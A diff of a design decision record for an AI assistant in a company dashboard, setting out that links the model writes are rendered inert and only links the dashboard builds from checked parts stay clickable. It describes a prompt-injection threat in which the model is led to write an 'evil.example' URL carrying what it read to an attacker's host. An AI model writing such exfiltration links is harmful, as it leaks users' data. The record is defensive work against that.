@@ -2,7 +2,7 @@
 
 - **Status:** accepted
 - **Authority:** `internal/assistant/wire`
-- **Enforced-by:** `internal/assistant/catalog.TestEveryDefaultReadIsBounded`, `internal/assistant/catalog.TestAGenericListReadIsOnePage`, `internal/assistant/cards.TestARecordCarriesTheKeyProseWritesItBy`, `internal/assistant/cards.TestTheModelIsToldARecordsKey`, `internal/assistant/cards.TestAKeyedKindNeedsItsKeyAndNoOtherHasOne`, `internal/assistant/catalog.TestARecordIsKeyedTheWayTheAnswerNamesIt`, `internal/assistant/catalog.TestAReadTooLargeToShowIsNamedLinkedAndToldToTheModel`, `internal/assistant/catalog.TestACutReadTellsTheModelOnlyWhatTheEngineKnows`, `internal/assistant/catalog.TestEveryModelTextGoesThroughThePipeline`, `internal/assistant/catalog.TestEveryNarrowingArgumentNarrows`, `internal/assistant/catalog.TestAPageWithMoreIsNeverTheWhole`, `internal/assistant/wire.TestTheDashboardSpeaksTheAssistantProtocol`, and the dashboard's `mentions.test.tsx`, `reads.test.tsx`, `Thread.test.tsx` and `lib/markdown.test.tsx` (`prose`)
+- **Enforced-by:** `internal/assistant/catalog.TestEveryDefaultReadIsBounded`, `internal/assistant/catalog.TestAGenericListReadIsOnePage`, `internal/assistant/cards.TestARecordCarriesTheKeyProseWritesItBy`, `internal/assistant/cards.TestTheModelIsToldARecordsKey`, `internal/assistant/cards.TestAKeyedKindNeedsItsKeyAndNoOtherHasOne`, `internal/assistant/catalog.TestARecordIsKeyedTheWayTheAnswerNamesIt`, `internal/assistant/catalog.TestAReadTooLargeToShowIsNamedLinkedAndToldToTheModel`, `internal/assistant/catalog.TestACutReadTellsTheModelOnlyWhatTheEngineKnows`, `internal/assistant/catalog.TestEveryModelTextGoesThroughThePipeline`, `internal/assistant/catalog.TestEveryNarrowingArgumentNarrows`, `internal/assistant/catalog.TestAPageWithMoreIsNeverTheWhole`, `internal/assistant/wire.TestTheDashboardSpeaksTheAssistantProtocol`, and the dashboard's `mentions.test.tsx`, `reads.test.tsx`, `Thread.test.tsx`, `inert.test.tsx`, `components/InlineToken.test.tsx` (`checked links`) and `lib/markdown.test.tsx` (`prose`)
 - **Cost-when-tried:** the drawer drew a folded card for every read a turn made. An answer on the Inbox that read two tasks, a table and an agent, and then both tasks again, stood six cards of about 140px each between the reader and the answer in a 560px drawer, each saying its key twice (in its summary and as its link's label), and the same record twice. An answer on Company › Brand added a blue notice per read and table cards whose CSV, XLSX and link wrapped onto a second line or not depending on the length of the title.
 - **Tag-status:** unreleased
 
@@ -25,9 +25,26 @@ file, a brief and an open in app are the point of their turn and stay cards.
 
 **The records are the turn's reads, never the model's words.** Only a record
 a read built a card for can become a chip; a key the model writes that the
-turn never read stays text, so nothing the model writes becomes a link, and
-every chip's link is the engine's own address, checked by the dashboard as
-every card's was.
+turn never read is no chip, and every chip's link is the engine's own address,
+checked by the dashboard as every card's was.
+
+**No address the model writes is opened; a link the dashboard builds is.** The
+answer's words are read with `links: "checked"` (`lib/inlineTokens.ts`,
+`LinkMode`), the rule the Inbox reads an agent's words by too: a link is live
+only where the dashboard BUILT it, from parts it checked, to a place that is
+the company's. A key whose project is the company's opens its work item and a
+handle in the chart its seat, both app routes the dashboard writes; a
+reference, a commit or a repository opens the code host the company
+configured; and an address on a host the company configured (a code host,
+Jira, Confluence, Mattermost) opens as it is rebuilt from what it names
+(`<host>/<owner>/<repo>/pull/14`), with no query, fragment or anything else
+the model wrote. Every other address, an app route the model spelled among
+them, is drawn inert: its words and the host it names, readable and copyable,
+and never a control. A picture is its alt text, never fetched. The threat is
+a prompt injection that has the model write `https://evil.example/?q=<what it
+read>`: a click there hands the words to the host's owner, where a click on a
+link the dashboard built carries only a validated name or number to the
+company's own place.
 
 **A record carries the key prose writes it by.** `EntityCard.key` is a task's
 key or a project's, set from the record by its read's spec, never guessed from
@@ -78,6 +95,14 @@ as its tools gave it, outside code.
 - **Matching on the subtitle.** A task's subtitle happens to be its key today,
   but a page's is its space and a seat's its handle. A rule that guessed would
   turn a space's name into a page's chip.
+- **Every link the model writes inert, as this record first decided.** A key
+  or a pull request named in an answer was then grey text the reader had to
+  find again by hand, though the dashboard could build its link from the
+  same checked parts it links a key by everywhere else. What made a model's
+  link dangerous was the address it chose, never the record it named.
+- **Every link live where its address is safe (`anchor`).** `safeHref`
+  refuses a script and keeps an `https:` address, and an `https:` address is
+  exactly what carries the words away.
 - **Matching the rendered DOM or React tree.** The renderer draws code through
   a component and an inert link as a span, so a walker that skips "code" and
   "a" elements by tag misses both. The renderer already knows which words are
